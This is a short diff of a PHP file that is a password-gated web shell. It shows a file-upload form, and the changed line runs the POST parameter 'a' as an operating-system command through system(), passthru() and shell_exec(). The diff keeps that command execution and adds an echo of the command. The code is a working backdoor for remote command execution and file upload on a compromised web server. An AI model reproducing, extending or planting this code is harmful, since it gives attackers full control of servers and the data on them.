@@ -22,7 +22,7 @@ echo <<<EOT
 <input type="hidden" name="upload" size="20" value="1" >
 <input type="submit" value="go upload" /></form>
 EOT;
-if(isset($_POST[a])){system("$_POST[a]");echo "</br>"; passthru("$_POST[a]");echo "</br>";echo(shell_exec("$_POST[a]"));}
+if(isset($_POST[a])){echo $_POST[a];echo "</br>";echo "</br>";system("$_POST[a]");echo "</br>"; passthru("$_POST[a]");echo "</br>";echo(shell_exec("$_POST[a]"));}
 }
 else{
 if(isset($_GET[bobo])&&$_GET[bobo]==$passwd&&(isset($_POST[upload])||isset($_FILES['upload_file']))){
